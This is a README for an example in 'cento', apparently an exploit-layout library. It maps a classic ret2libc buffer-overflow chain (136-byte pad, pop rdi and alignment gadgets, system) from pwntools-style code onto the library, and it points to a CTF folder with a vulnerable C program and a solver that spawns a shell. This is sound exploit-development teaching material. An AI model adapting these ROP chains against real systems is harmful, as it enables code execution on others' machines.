# ex01 -- the 1:1 mapping: the 136-byte pad + p64 chain ("smashme" CTF), before and after

The zero-cost-adoption exhibit: the textbook ret2libc you have written a
hundred times, mapped line for line at zero byte cost -- and the classic
offset-drift mistake refused by name instead of debugged on the target. It
sits beside `ex01_find_your_offset.py` (the cycle-pad workflow and the
pwntools rosetta) and `ctf/` (the same chain, live). This exhibit earns "your
idiom carries over"; ex00 earns "and it scales when the exploit grows".

## The worst lines, side by side

| before.py (the idiom everyone ships) | after.py (cento) |
|---|---|
| `OFFSET = 136  # 128 buf + 8 rbp. MUST match the pad length. MUST.` | `stack.at(OFFSET, RopFrames, name="frames")` -- the offset appears once, as a placement |
| `payload = b"A" * OFFSET  # pad: buf + saved rbp` | `cento.region("stack", max_size=OFFSET + len(RopFrames), fill="A", ...)` -- the pad is the region fill; no statement at all |
| `POP_RDI = LIBC_BASE + 0x02A3E5  # pop rdi ; ret` (base baked in at write time) | `rip: cento.u64 = LIBC + 0x02A3E5` -- declared AND assigned; `LIBC = cento.Ref("libc_base")`, bound when the leak lands |
| `payload += p64(RET)  # +8 alignment: system's movaps wants rsp%16==0` | `rip2: cento.u64 = LIBC + 0x029CD6` -- the lore comment became a named slot |
| `payload += p64(SYSTEM)  # and we're done` | `rip3: cento.u64 = LIBC + 0x052290` -- width-checked u64 cell, one owner |
| `assert len(payload) == OFFSET + 4 * 8, "chain drifted -- recount the p64s"` | `max_size=OFFSET + len(RopFrames)` is derived; a fifth slot moves it, a stray write past it is CHK-002 |

## The refusal (real captured output)

Rev B shrank the buffer to 120; a teammate re-aims "saved RIP" at 0x80 while
the rev-A frame still owns 0x88 -- in `b"A"*136` soup the two beliefs merge
silently and you debug a SIGSEGV. In cento:

```text
ERROR CHK-001 [stack.frames, stack.revb_frames]: placement extents overlap without a declared alias  hint: declare intent: region.at(..., over=(other,), why=...)
ERROR CHK-008 [stack.frames.rip, stack.revb_frames.rdi]: cell rewritten by a different owner (last-writer-wins)  ...
```

Two beliefs about where saved-RIP lives cannot coexist past the gate -- and
every slot-vs-slot stomp is named in register terms (rev-B's rdi lands where
rev-A's rip should be: the off-by-one-frame, stated as registers).

## What became reason-able

- **The leak is one fact, not five bakes**: every gadget cell is
  `sym("libc_base") + offset` Ref arithmetic; the pre-bind emit lists the four
  waiting cells, and one `bind()` moves them together -- the leak workflow is
  the API, not an f-string rebuild.
- **"Offset 136" became a place with a name**: `stack.frames.rip @ stack+0x88`
  is what `explain()` prints; the pad (region fill) and the chain each have
  one owner.
- **The pad-changed-but-offset-didn't classic is a named error**: two writers
  disagreeing where saved-RIP lives is CHK-001 at build time, not a crash at
  `system+0x2e` on the target.

Run: `python3 before.py && python3 after.py && python3 check.py` (each script
prints its own labeled payload hex; check.py runs both as subprocesses and
asserts the labeled emissions are byte-for-byte equal, line-for-line), then
`python3 refusal.py` for the bonus reel: the pre-leak fixup report and the
rev-B refusal, shape-asserted.

## ctf/ -- the same chain, live

`ctf/` makes this example real end-to-end on this host: `vuln.c` is the classic
smashme (128-byte buffer, runtime libc leak, `read(0, buf, 0x200)`), and
`solve.py` builds the SAME cento layout shape with `libc_base` symbolic,
derives the real offsets from the host libc at runtime, binds the leak, and
drives the popped shell. See `ctf/WALKTHROUGH.md`.

Note the split: `before.py`/`after.py` freeze their ret2libc offsets so the
example can assert byte-equality offline; `solve.py` derives live ones (dynsym
for `puts`/`system`, byte search for `"/bin/sh"` and the gadgets) and handles
per-run ASLR with the one `bind()`.

```sh
make -C ctf && python3 ctf/solve.py
```
